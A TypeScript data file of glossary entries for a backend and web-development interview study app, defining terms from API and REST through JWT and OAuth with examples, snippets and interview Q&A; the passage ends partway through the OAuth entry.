import type { TermEntry } from '../types/atlas.ts';

export const TERMS_PART_1: TermEntry[] = [
  // ==========================================
  // STAGE 1: CORE WEB, APIs & PYTHON FOUNDATIONS
  // ==========================================
  {
    id: 'api',
    term: 'API',
    fullForm: 'Application Programming Interface',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'A formal contract and communication layer that allows two separate software systems to exchange data and trigger actions safely.',
    detailedDefinition:
      'An Application Programming Interface (API) defines the exact rules, request formats, endpoints, data structures, and error codes that one piece of software uses to interact with another without needing to know how the internal code is implemented. While web developers most often build HTTP/REST APIs, an API can also be a Python library interface (such as Django ORM methods), an operating system syscall interface, or a hardware driver contract.',
    whereAndWhyUsed:
      'Used everywhere in modern software to decouple frontend interfaces (React web apps, iOS/Android mobile apps) from backend business logic and databases, as well as to integrate third-party services like Stripe for payments, Twilio for SMS, or AWS S3 for file storage.',
    realWorldExample:
      'When a customer clicks "Pay Now" on an e-commerce app, the React frontend sends an HTTPS POST request to your Django REST Framework endpoint (/api/v1/payments/checkout/). Your backend API validates the order and calls Stripe’s external API to charge the card—neither system exposes its private database directly.',
    codeSnippet: `# FastAPI / DRF style endpoint contract
# Request: POST /api/v1/orders/
# Payload: {"product_id": 42, "quantity": 2}
# Response (201 Created):
{
  "order_id": "ord_98a7bc",
  "status": "CONFIRMED",
  "total_usd": 59.98
}`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does API stand for, and how is an API different from a full web application?',
        answer:
          'API stands for Application Programming Interface. A traditional web application renders HTML pages directly for a human user in a browser, whereas a backend API exposes structured data endpoints (usually returning JSON over HTTP) meant to be consumed programmatically by frontends, mobile apps, or other servers.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'Where and why do we use APIs instead of letting a mobile or React app connect directly to PostgreSQL?',
        answer:
          'Allowing a client device to connect directly to a database would expose database credentials, allow malicious users to run arbitrary queries, and tightly couple clients to table schemas. An API sits in the middle to enforce authentication (JWT/OAuth), role-based permissions (RBAC), rate limiting, input validation, and business logic before touching the database.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'How do you handle breaking changes in a production API when mobile clients cannot update immediately?',
        answer:
          'By implementing API Versioning—either in the URL path (/api/v1/users/ vs /api/v2/users/) or via custom HTTP headers (Accept: application/vnd.company.v2+json). This allows older mobile apps to keep using v1 while new clients migrate to v2.',
      },
    ],
    relatedTerms: ['rest', 'drf', 'http', 'json', 'sdk', 'grpc'],
  },
  {
    id: 'rest',
    term: 'REST / RESTful',
    fullForm: 'Representational State Transfer',
    isAcronym: true,
    category: 'Backend & APIs',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'An architectural style for designing stateless, resource-oriented networked APIs using standard HTTP methods and status codes.',
    detailedDefinition:
      'Coined by Roy Fielding in his 2000 doctoral dissertation, Representational State Transfer (REST) is not a protocol or library, but a set of six architectural constraints for building scalable web services: Client-Server separation, Statelessness (every request contains all information needed to process it), Cacheability, Uniform Interface (resource URIs + standard HTTP verbs), Layered System, and optional Code-on-Demand. An API that adheres to these constraints is called "RESTful".',
    whereAndWhyUsed:
      'Used as the industry-standard architecture for public and internal web APIs in Django REST Framework (DRF) and FastAPI because it leverages existing HTTP features (caching, status codes, verbs) and scales horizontally with ease since servers store no client session state.',
    realWorldExample:
      'Instead of creating RPC-style URLs like /getUserOrders or /deleteOrderById, a RESTful API models resources as nouns (/api/users/15/orders/99/) and uses HTTP verbs (GET to read, POST to create, PUT/PATCH to update, DELETE to remove) to transfer a JSON "representation" of the resource’s current state.',
    codeSnippet: `GET    /api/v1/articles/       -> 200 OK (List articles)
POST   /api/v1/articles/       -> 201 Created (Create new article)
GET    /api/v1/articles/42/    -> 200 OK (Retrieve article #42)
PATCH  /api/v1/articles/42/    -> 200 OK (Partial update article #42)
DELETE /api/v1/articles/42/    -> 204 No Content (Delete article #42)`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What is the full form of REST, and what does "Statelessness" actually mean in a RESTful API?',
        answer:
          'REST stands for Representational State Transfer. Statelessness means the server does not store any client context or session history in memory between requests. Every single HTTP request from the client must carry its own authentication credentials (such as a Bearer JWT) and state parameters so any server instance behind a load balancer can handle it.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'What makes an API truly RESTful versus just "HTTP + JSON"?',
        answer:
          'A truly RESTful API uses resource-based noun URIs (never verbs in URLs), relies on standard HTTP methods (GET, POST, PUT, PATCH, DELETE) for semantics, returns accurate HTTP status codes (200, 201, 204, 400, 401, 403, 404, 500), and remains stateless.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'What is the difference between PUT and PATCH in REST?',
        answer:
          'PUT is an idempotent full replacement of a resource (you must send all required fields of the object), whereas PATCH applies a partial update to only the fields provided in the request payload.',
      },
    ],
    relatedTerms: ['api', 'http', 'drf', 'json', 'crud', 'hateoas'],
  },
  {
    id: 'drf',
    term: 'DRF',
    fullForm: 'Django REST Framework',
    isAcronym: true,
    category: 'Backend & APIs',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'The premier Python toolkit built on top of Django for rapidly building secure, browsable, production-grade Web APIs.',
    detailedDefinition:
      'Django REST Framework (DRF) extends core Django with everything required to build RESTful APIs: Serializers (which convert complex Django ORM QuerySets and Model instances into native Python datatypes and validate incoming JSON payloads), class-based Views (APIView, GenericAPIView, ViewSets), automatic URL Routers, pluggable Authentication (Session, Token, JWT), granular Permission classes, Throttling (rate-limiting), and Pagination.',
    whereAndWhyUsed:
      'Used whenever a Python team uses Django for its battle-tested ORM, admin panel, and migrations, and needs to expose REST APIs for React/Vue SPAs, mobile apps, or external B2B integrations without writing boilerplate JSON parsing and validation code from scratch.',
    realWorldExample:
      'In an inventory management backend, you define a ProductSerializer(serializers.ModelSerializer) and a ProductViewSet(viewsets.ModelViewSet) with permission_classes = [IsAuthenticated]. In 12 lines of Python, DRF generates full CRUD endpoints, input validation, pagination, and an interactive Browsable API.',
    codeSnippet: `from rest_framework import serializers, viewsets, permissions
from .models import Product

class ProductSerializer(serializers.ModelSerializer):
    class Meta:
        model = Product
        fields = ['id', 'sku', 'name', 'price', 'stock']

class ProductViewSet(viewsets.ModelViewSet):
    queryset = Product.objects.select_related('category').all()
    serializer_class = ProductSerializer
    permission_classes = [permissions.IsAuthenticatedOrReadOnly]`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does DRF stand for, and why do we need DRF when plain Django can already return JsonResponse?',
        answer:
          'DRF stands for Django REST Framework. While plain Django can return a basic JsonResponse, you would have to manually write input validation, model-to-dict serialization, pagination, token authentication, object-level permissions, rate limiting, and content negotiation. DRF provides all of these out of the box with a clean, extensible architecture.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'Explain how Serializers work in DRF and the difference between field-level and object-level validation.',
        answer:
          'Serializers work in two directions: Serialization (Model/QuerySet -> Python dict -> JSON response) and Deserialization (JSON request -> validated_data -> Model save). Field-level validation uses validate_<field_name>(self, value) to validate a single attribute (e.g., checking price > 0), while object-level validation uses validate(self, attrs) when validation depends on multiple fields (e.g., ensuring end_date > start_date).',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'When should you use APIView vs GenericAPIView/Mixins vs ModelViewSet in DRF?',
        answer:
          'Use ModelViewSet when exposing standard CRUD operations on a Django model with a Router. Use GenericAPIView with Mixins (like ListCreateAPIView) when you only want specific CRUD actions on a model. Use base APIView for non-model endpoints like a custom payment webhook, login handler, or health-check aggregation.',
      },
    ],
    relatedTerms: ['api', 'rest', 'orm', 'json', 'jwt', 'rbac'],
  },
  {
    id: 'json',
    term: 'JSON',
    fullForm: 'JavaScript Object Notation',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'A lightweight, human-readable text format for storing and transporting structured key-value and array data across networks.',
    detailedDefinition:
      'JavaScript Object Notation (JSON) is a language-independent data serialization format derived from JavaScript object syntax. Despite its name, every modern programming language—including Python via the built-in `json` module, Pydantic, and DRF—natively parses and generates JSON. It supports six core data types: strings (in double quotes), numbers, objects (key-value maps), arrays, booleans (`true`/`false`), and `null`.',
    whereAndWhyUsed:
      'Used as the universal payload format for REST APIs, NoSQL document databases (MongoDB, PostgreSQL JSONB columns), configuration files (`package.json`), and structured application logs.',
    realWorldExample:
      'When your Python backend calls `json.dumps(data)` or DRF’s `JSONRenderer` serializes a user object, Python converts `None` to `null`, `True` to `true`, and `dict` to a JSON string (`{"id": 1, "is_active": true, "deleted_at": null}`) with MIME header `Content-Type: application/json`.',
    codeSnippet: `import json

# Python dict -> JSON string (Serialization)
payload = {"user_id": 104, "active": True, "roles": ["editor"], "bio": None}
raw_json = json.dumps(payload)
# '{"user_id": 104, "active": true, "roles": ["editor"], "bio": null}'

# JSON string -> Python dict (Deserialization)
parsed = json.loads(raw_json)`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does JSON stand for, and why did JSON replace XML as the default format for REST APIs?',
        answer:
          'JSON stands for JavaScript Object Notation. It replaced XML in most web APIs because JSON is significantly less verbose (no closing tags), smaller over the wire, faster to parse into native dictionaries/arrays in Python and JavaScript, and maps directly to object structures.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'In Python, what is the difference between json.dump() vs json.dumps(), and what types cannot be serialized by default?',
        answer:
          '`json.dumps()` (dump string) serializes a Python object into a JSON-formatted string in memory, while `json.dump()` writes the JSON directly to a file-like stream. By default, Python `datetime`, `UUID`, `Decimal`, and custom class instances are not JSON-serializable without a custom encoder (which DRF Serializers and FastAPI/Pydantic handle automatically).',
      },
    ],
    relatedTerms: ['api', 'rest', 'mime', 'utf-8', 'protobuf', 'bson'],
  },
  {
    id: 'http',
    term: 'HTTP / HTTPS',
    fullForm: 'Hypertext Transfer Protocol (Secure)',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'The foundational application-layer request-response protocol of the World Wide Web, encrypted via TLS in HTTPS.',
    detailedDefinition:
      'Hypertext Transfer Protocol (HTTP) is an application-layer protocol that governs how clients (browsers, mobile apps, curl) send requests (containing a method verb, URI path, headers, and optional body) and how servers return responses (containing a 3-digit status code, headers, and body). HTTPS (Hypertext Transfer Protocol Secure) wraps HTTP communication inside an encrypted TLS (Transport Layer Security) tunnel so attackers on the network cannot eavesdrop on or tamper with headers, cookies, JWTs, or JSON bodies.',
    whereAndWhyUsed:
      'Used in every web page load, REST API call, webhook delivery, and microservice call over the internet. HTTPS is mandatory in production to protect credentials, session cookies, and user privacy.',
    realWorldExample:
      'When a client sends an HTTPS login request, the client and Nginx server first perform a TLS handshake using an SSL/TLS certificate (issued by Let’s Encrypt or AWS ACM) to establish symmetric encryption before the HTTP POST body containing the user’s password ever leaves the browser.',
    codeSnippet: `POST /api/v1/auth/login HTTP/1.1
Host: api.example.com
Content-Type: application/json
Accept: application/json

{"email": "dev@example.com", "password": "secret"}

---
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{"access_token": "eyJhbGciOi..."}`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do HTTP and HTTPS stand for, and how does HTTPS actually secure the request?',
        answer:
          'HTTP stands for Hypertext Transfer Protocol, and HTTPS stands for Hypertext Transfer Protocol Secure. HTTPS secures HTTP by layering it over TLS (Transport Layer Security). During the TLS handshake, asymmetric cryptography (RSA/ECDHE) verifies the server’s certificate and negotiates a shared session key, and then fast symmetric encryption (AES) encrypts the entire HTTP request—including URL path, query params, headers, and body.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'Explain the 5 categories of HTTP status codes and give a real backend scenario for 401 vs 403 vs 422 vs 502.',
        answer:
          '1xx Informational, 2xx Success (200 OK, 201 Created, 204 No Content), 3xx Redirection (301, 304 Not Modified), 4xx Client Error, 5xx Server Error. Specifically: 401 Unauthorized means missing/invalid authentication token; 403 Forbidden means authenticated user lacks permission; 422 Unprocessable Entity (common in FastAPI) or 400 Bad Request means payload validation failed; 502 Bad Gateway means Nginx could not reach the upstream Gunicorn/Uvicorn Python process.',
      },
    ],
    relatedTerms: ['rest', 'tls', 'tcp', 'cors', 'url', 'mime'],
  },
  {
    id: 'crud',
    term: 'CRUD',
    fullForm: 'Create, Read, Update, Delete',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'The four fundamental lifecycle operations performed on persistent data in databases and REST APIs.',
    detailedDefinition:
      'CRUD stands for Create, Read, Update, and Delete—the four foundational operations of persistent storage. Every data-driven feature (user profiles, blog posts, e-commerce orders) maps directly across the stack from REST HTTP verbs to Django ORM methods to underlying SQL statements.',
    whereAndWhyUsed:
      'Used when designing database schemas, RESTful endpoints, and role-based permission matrices (e.g., granting a user Read-only access vs full CRUD access).',
    realWorldExample:
      'In a Django application: Create = POST / SQL INSERT / `Model.objects.create()`; Read = GET / SQL SELECT / `Model.objects.get()`; Update = PUT or PATCH / SQL UPDATE / `instance.save()`; Delete = DELETE / SQL DELETE / `instance.delete()`.',
    codeSnippet: `# Mapping CRUD across HTTP, Django ORM, and SQL:
# CREATE -> POST   -> Book.objects.create(title="Clean Code") -> INSERT INTO books ...
# READ   -> GET    -> Book.objects.filter(id=1)               -> SELECT * FROM books WHERE id=1
# UPDATE -> PATCH  -> Book.objects.filter(id=1).update(...)   -> UPDATE books SET ...
# DELETE -> DELETE -> Book.objects.filter(id=1).delete()      -> DELETE FROM books WHERE id=1`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does CRUD stand for, and how does each operation map to HTTP methods and SQL statements?',
        answer:
          'CRUD stands for Create (HTTP POST / SQL INSERT), Read (HTTP GET / SQL SELECT), Update (HTTP PUT or PATCH / SQL UPDATE), and Delete (HTTP DELETE / SQL DELETE).',
      },
      {
        questionType: 'Where & Why Used',
        question: 'In production backends, why do we often use "Soft Delete" instead of actual CRUD Delete?',
        answer:
          'A hard SQL DELETE permanently removes rows and can break foreign-key audit trails, billing history, or analytics. Instead, production systems often implement a soft delete by setting an `is_deleted=True` or `deleted_at=timezone.now()` timestamp via an UPDATE query, filtering out soft-deleted records in default ORM managers.',
      },
    ],
    relatedTerms: ['rest', 'sql', 'orm', 'drf', 'dml'],
  },
  {
    id: 'orm',
    term: 'ORM',
    fullForm: 'Object-Relational Mapping',
    isAcronym: true,
    category: 'Backend & APIs',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'A programming technique and library layer that maps relational database tables to Python classes and rows to objects.',
    detailedDefinition:
      'Object-Relational Mapping (ORM) bridges the "object-relational impedance mismatch" between object-oriented programming languages (like Python) and relational databases (like PostgreSQL or MySQL). Instead of writing raw SQL strings, developers define database tables as Python classes (Models) and query or mutate rows using Python method chains (`QuerySets` in Django ORM or sessions in SQLAlchemy). The ORM compiles those Python expressions into parameterized SQL queries under the hood.',
    whereAndWhyUsed:
      'Used in Django (Django ORM) and FastAPI/Flask (SQLAlchemy, SQLModel, Tortoise ORM) to speed up development, manage schema migrations automatically, stay database-agnostic, and prevent SQL Injection (SQLi) by automatically parameterizing query inputs.',
    realWorldExample:
      'Instead of writing a raw SQL JOIN string and manually escaping user input, you write `Order.objects.select_related("customer").filter(status="PAID", total__gte=100)` in Django, which compiles into a safe, parameterized `SELECT ... INNER JOIN ... WHERE` query.',
    codeSnippet: `# ❌ N+1 Query Problem (1 query for orders + N queries in loop):
orders = Order.objects.all()
for order in orders:
    print(order.customer.email)  # Hits DB on every iteration!

# ✅ Optimized with select_related (1 single SQL INNER JOIN query):
orders = Order.objects.select_related('customer').prefetch_related('items').all()`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does ORM stand for, and what are the main advantages and disadvantages of using an ORM?',
        answer:
          'ORM stands for Object-Relational Mapping. Advantages: faster development in native Python, automatic schema migrations, built-in protection against SQL Injection via parameterized queries, and easier maintenance. Disadvantages: can generate suboptimal SQL for complex analytical queries, and careless usage inside loops easily causes the N+1 query performance bottleneck.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'What is the N+1 query problem in Django ORM, and what is the exact difference between select_related and prefetch_related?',
        answer:
          'The N+1 problem happens when you fetch a list of objects in 1 query and then access a related foreign-key object inside a loop, triggering N additional SQL queries. `select_related` solves this for single-valued relationships (ForeignKey and OneToOneField) by executing a single SQL `JOIN`. `prefetch_related` is used for multi-valued relationships (ManyToManyField and reverse ForeignKeys)—it executes a separate second query with `WHERE id IN (...)` and joins the results in Python memory.',
      },
    ],
    relatedTerms: ['sql', 'drf', 'rdbms', 'crud', 'sqli', 'acid'],
  },
  {
    id: 'sql',
    term: 'SQL',
    fullForm: 'Structured Query Language',
    isAcronym: true,
    category: 'Databases & SQL',
    roadmapStage: 1,
    priority: 'Critical',
    shortSummary: 'The standardized declarative domain-specific language used to define, query, update, and control relational databases.',
    detailedDefinition:
      'Structured Query Language (SQL) is the standard language for interacting with Relational Database Management Systems (RDBMS) such as PostgreSQL, MySQL, SQLite, and Oracle. SQL is declarative—meaning you specify *what* data you want (`SELECT name FROM users WHERE active = true`), and the database’s internal query planner/optimizer figures out *how* to retrieve it most efficiently using indexes, table scans, or hash joins.',
    whereAndWhyUsed:
      'Used directly for database migrations, complex analytical reporting (window functions, CTEs, aggregations), performance tuning with `EXPLAIN ANALYZE`, and indirectly beneath every ORM call.',
    realWorldExample:
      'When debugging a slow Django endpoint taking 1.8 seconds, you inspect `queryset.query` to view the generated SQL, run `EXPLAIN ANALYZE` in PostgreSQL, and discover a missing composite B-Tree index on `(tenant_id, created_at)`.',
    codeSnippet: `SELECT u.id, u.email, COUNT(o.id) AS total_orders
FROM users u
LEFT JOIN orders o ON o.user_id = u.id
WHERE u.is_active = TRUE
GROUP BY u.id, u.email
HAVING COUNT(o.id) >= 5
ORDER BY total_orders DESC;`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does SQL stand for, and what are its 5 sub-languages?',
        answer:
          'SQL stands for Structured Query Language. Its five sub-languages are: DDL (Data Definition Language: CREATE, ALTER, DROP), DML (Data Manipulation Language: INSERT, UPDATE, DELETE), DQL (Data Query Language: SELECT), DCL (Data Control Language: GRANT, REVOKE), and TCL (Transaction Control Language: COMMIT, ROLLBACK, SAVEPOINT).',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'What is the difference between WHERE and HAVING in a SQL query?',
        answer:
          '`WHERE` filters individual rows *before* `GROUP BY` aggregation occurs (and can use standard column indexes), whereas `HAVING` filters the aggregated groups *after* `GROUP BY` and aggregate functions (`COUNT`, `SUM`, `AVG`) have been computed.',
      },
    ],
    relatedTerms: ['rdbms', 'orm', 'acid', 'ddl', 'dml', 'dql', 'pk', 'fk'],
  },
  {
    id: 'url',
    term: 'URL vs URI',
    fullForm: 'Uniform Resource Locator / Uniform Resource Identifier',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'Essential',
    shortSummary: 'URI identifies a resource by name or location; URL is a specific type of URI that also specifies how and where to locate it on a network.',
    detailedDefinition:
      'A Uniform Resource Identifier (URI) is a string of characters that unambiguously identifies a particular resource. It has two subsets: URL (Uniform Resource Locator) and URN (Uniform Resource Name). A URL not only identifies the resource, it provides the exact network protocol/mechanism (`https://`) and domain/path (`api.example.com/v1/users/42?active=true`) to fetch it. Every URL is a URI, but not every URI is a URL (for example, `urn:isbn:0451450523` is a URI/URN that identifies a book without giving a network address).',
    whereAndWhyUsed:
      'Used in routing tables (`urls.py` in Django), REST endpoint design, DNS resolution, and OAuth redirect callbacks.',
    realWorldExample:
      '`https://api.myshop.com:443/v1/products?category=books#reviews` is both a URI and a URL consisting of Scheme (`https`), Host (`api.myshop.com`), Port (`443`), Path (`/v1/products`), Query String (`?category=books`), and Fragment (`#reviews`).',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do URL and URI stand for, and what is the difference between them?',
        answer:
          'URL stands for Uniform Resource Locator, and URI stands for Uniform Resource Identifier. Every URL is a URI, because locating a resource also identifies it. However, a URI can also be a URN (Uniform Resource Name) which identifies a resource by name without telling you what protocol or network address to use to retrieve it.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'When designing REST URLs in Django or FastAPI, when should you use path parameters vs query parameters?',
        answer:
          'Use path parameters (e.g., `/users/42/orders`) to identify a specific hierarchical resource or collection, and use query parameters (e.g., `/orders?status=pending&page=2&sort=-created_at`) for optional filtering, searching, sorting, and pagination.',
      },
    ],
    relatedTerms: ['http', 'dns', 'rest', 'api'],
  },
  {
    id: 'dns',
    term: 'DNS',
    fullForm: 'Domain Name System',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'High',
    shortSummary: 'The hierarchical distributed naming system of the internet that translates human-readable domain names into IP addresses.',
    detailedDefinition:
      'The Domain Name System (DNS) acts as the phonebook of the internet. Computers communicate over TCP/IP using numerical IP addresses (like `198.51.100.42` for IPv4 or `2001:0db8::1` for IPv6), whereas humans use domain names (`api.stripe.com`). When a client makes a request, a DNS resolver checks local caches and queries Root, TLD (`.com`), and Authoritative Name Servers to retrieve records such as `A` (IPv4), `AAAA` (IPv6), `CNAME` (alias), `MX` (mail), and `TXT` (verification).',
    whereAndWhyUsed:
      'Used whenever deploying a custom domain on Netlify, Vercel, AWS Route53, or Cloudflare, configuring SSL certificates, or routing microservice subdomains (`api.company.com`) to a Load Balancer.',
    realWorldExample:
      'When you deploy this app to Netlify and point `study.yourdomain.com` to Netlify’s load balancer, you create a DNS `CNAME` record with a TTL (Time To Live) of 3600 seconds.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does DNS stand for, and what is the difference between an A record and a CNAME record?',
        answer:
          'DNS stands for Domain Name System. An `A` (Address) record maps a domain or subdomain directly to an IPv4 address (e.g., `104.21.11.2`), while a `CNAME` (Canonical Name) record maps one domain name as an alias to another domain name (e.g., `app.example.com` -> `myapp.netlify.app`).',
      },
    ],
    relatedTerms: ['http', 'tcp', 'udp', 'cdn', 'ttl'],
  },
  {
    id: 'tcp-udp',
    term: 'TCP / UDP / IP',
    fullForm: 'Transmission Control Protocol / User Datagram Protocol / Internet Protocol',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'High',
    shortSummary: 'Core transport and network layer protocols: IP routes packets by address, TCP guarantees ordered reliable delivery, and UDP prioritizes low-latency speed.',
    detailedDefinition:
      'Internet Protocol (IP) handles addressing and routing packets from source IP to destination IP across networks. Above IP sits the Transport Layer: TCP (Transmission Control Protocol) is connection-oriented—it performs a 3-way handshake (`SYN`, `SYN-ACK`, `ACK`), guarantees packets arrive in exact order, retransmits lost packets, and manages congestion. UDP (User Datagram Protocol) is connectionless—"fire and forget" with no handshake or retransmission overhead, trading reliability for minimal latency.',
    whereAndWhyUsed:
      'TCP powers HTTP/1.1, HTTP/2, HTTPS, WebSockets, SSH, and PostgreSQL connections where missing a single byte would corrupt JSON or SQL data. UDP powers DNS lookups, WebRTC video/voice calls, live multiplayer gaming, and HTTP/3 (QUIC) where speed matters more than retrying dropped frames.',
    realWorldExample:
      'Your Django app connects to PostgreSQL over TCP port 5432 so every SQL transaction is guaranteed to arrive intact, while the initial DNS lookup to resolve the database hostname uses a fast single-packet UDP request on port 53.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do TCP and UDP stand for, and how do you decide which protocol fits a system design problem?',
        answer:
          'TCP stands for Transmission Control Protocol and UDP stands for User Datagram Protocol. Choose TCP whenever data integrity and ordering are non-negotiable (REST APIs, financial transactions, database connections, chat messages). Choose UDP when real-time low latency is critical and stale lost packets are useless anyway (live video/audio streaming, VoIP, DNS queries, online gaming).',
      },
    ],
    relatedTerms: ['http', 'dns', 'ws', 'tls'],
  },
  {
    id: 'utf-8-mime',
    term: 'UTF-8 & MIME',
    fullForm: 'Unicode Transformation Format (8-bit) & Multipurpose Internet Mail Extensions',
    isAcronym: true,
    category: 'Common Development',
    roadmapStage: 1,
    priority: 'Essential',
    shortSummary: 'UTF-8 encodes universal characters/emojis into bytes; MIME types (like application/json) tell clients and servers how to interpret those bytes.',
    detailedDefinition:
      'UTF-8 (Unicode Transformation Format — 8-bit) is a variable-width character encoding capable of encoding all 1,112,064 valid Unicode code points using 1 to 4 bytes, while remaining 100% backward-compatible with 7-bit ASCII. MIME (Multipurpose Internet Mail Extensions) is the standard identifier format used in HTTP `Content-Type` and `Accept` headers (`type/subtype`, such as `application/json`, `text/html; charset=utf-8`, or `multipart/form-data`) so the receiving system knows how to parse the byte stream.',
    whereAndWhyUsed:
      'Used in every HTTP request/response header, file upload validation in Django/FastAPI, and database character set configuration.',
    realWorldExample:
      'When uploading a user avatar alongside form fields in FastAPI, the browser sends `Content-Type: multipart/form-data`, whereas a standard JSON API call sends `Content-Type: application/json; charset=utf-8`.',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do UTF-8 and MIME stand for, and why does a backend return 415 Unsupported Media Type?',
        answer:
          'UTF-8 stands for Unicode Transformation Format (8-bit), and MIME stands for Multipurpose Internet Mail Extensions. A backend returns HTTP 415 Unsupported Media Type when the client sends a payload with a MIME `Content-Type` header (e.g., `text/plain` or `application/xml`) that the API endpoint is not configured to parse.',
      },
    ],
    relatedTerms: ['http', 'json', 'rest'],
  },

  // ==========================================
  // STAGE 2: SECURITY, AUTHENTICATION & ACCESS CONTROL
  // ==========================================
  {
    id: 'jwt',
    term: 'JWT',
    fullForm: 'JSON Web Token',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'Critical',
    shortSummary: 'A compact, cryptographically signed, URL-safe token format (`header.payload.signature`) used for stateless authentication across APIs.',
    detailedDefinition:
      'A JSON Web Token (JWT, defined in RFC 7519) is a self-contained string composed of three Base64URL-encoded parts separated by dots: Header (specifying the signing algorithm like HS256 or RS256), Payload (containing "claims" such as `sub` user ID, `role`, `iat` issued-at, and `exp` expiration timestamp), and Signature (created by hashing the header + payload with a server secret or private key). Because the token is signed, the backend can verify its authenticity and read the user ID using CPU verification alone—without querying a session table in the database on every request.',
    whereAndWhyUsed:
      'Used in Django REST Framework (`djangorestframework-simplejwt`) and FastAPI (`PyJWT` / `python-jose`) for stateless API authentication across SPAs, mobile apps, and microservices.',
    realWorldExample:
      'Upon login, your Django API returns a short-lived `access` JWT (valid for 15 minutes) and a longer-lived `refresh` JWT (valid for 7 days, stored in an `HttpOnly` secure cookie). On every API request, the frontend sends `Authorization: Bearer <access_token>`.',
    codeSnippet: `# JWT Structure: Header.Payload.Signature
# 1. Header (Base64URL):  {"alg": "HS256", "typ": "JWT"}
# 2. Payload (Base64URL): {"sub": "user_42", "role": "admin", "exp": 1735689600}
# 3. Signature:           HMACSHA256(base64Url(header) + "." + base64Url(payload), SECRET_KEY)`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What does JWT stand for, what are its three parts, and can someone read the payload without your SECRET_KEY?',
        answer:
          'JWT stands for JSON Web Token. Its three dot-separated parts are Header, Payload, and Signature. Yes—anyone who intercepts a JWT can Base64-decode the Header and Payload and read all claims inside! The SECRET_KEY does NOT encrypt the payload; it signs the token so the server can detect if anyone modified the payload. Never put passwords or sensitive secrets inside a JWT payload.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'Why do production systems use both an Access Token and a Refresh Token instead of a single 30-day JWT?',
        answer:
          'Because JWTs are stateless, a pure JWT cannot be easily revoked before its `exp` timestamp without adding a database/Redis blocklist. If a 30-day Access Token is stolen, the attacker has access for 30 days. By making the Access Token expire in 5–15 minutes and issuing a Refresh Token (which IS checked against the database/Redis and rotated when used), you get fast stateless verification on 99% of requests while retaining the ability to revoke compromised sessions.',
      },
    ],
    relatedTerms: ['oauth', 'oidc', 'hmac', 'rbac', 'sso', 'drf'],
  },
  {
    id: 'oauth',
    term: 'OAuth 2.0 & OIDC',
    fullForm: 'Open Authorization & OpenID Connect',
    isAcronym: true,
    category: 'Security & Auth',
    roadmapStage: 2,
    priority: 'Critical',
    shortSummary: 'OAuth 2.0 is the industry standard for delegated authorization (access tokens); OIDC is the identity layer built on top of OAuth 2.0 for user login (ID tokens).',
    detailedDefinition:
      'OAuth 2.0 (Open Authorization) is an authorization framework that lets a user grant a third-party application limited access to their resources on another service (like Google Drive or GitHub) without ever sharing their password. Instead of passwords, OAuth issues scoped Access Tokens via flows like Authorization Code Flow (with PKCE). OpenID Connect (OIDC) sits directly on top of OAuth 2.0 to add Authentication: in addition to an Access Token, the provider returns a signed JWT called an `id_token` containing verified user profile identity (`email`, `name`, `sub`).',
    whereAndWhyUsed:
      'Used whenever implementing "Sign in with Google / GitHub / Microsoft" (OIDC) or connecting a backend app to read a user’s Google Calendar or GitHub repositories (OAuth 2.0 scopes).',
    realWorldExample:
      'When a user clicks "Continue with Google" on your app, they are redirected to Google’s consent screen. Google redirects back to your backend with a short-lived `code`. Your Python backend exchanges that `code` + client secret for an OIDC `id_token` (proving who the user is) and an OAuth `access_token` (scoped to read their calendar).',
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do OAuth and OIDC stand for, and why is OAuth 2.0 alone considered Authorization rather than Authentication?',
        answer:
          'OAuth stands for Open Authorization and OIDC stands for OpenID Connect. Pure OAuth 2.0 was designed to grant delegated permissions (via an Access Token to call an API on someone’s behalf) and does not specify a standard format for user identity. OIDC extends OAuth 2.0 by standardizing an `id_token` (a JWT) and a `/userinfo` endpoint specifically for verifying user identity (Authentication).',
      },
      {
        questionType: 'Where & Why Used',
        question: 'In OAuth 2.0 Authorization Code flow, why don’t we return the Access Token directly in the browser redirect URL?',
        answer:
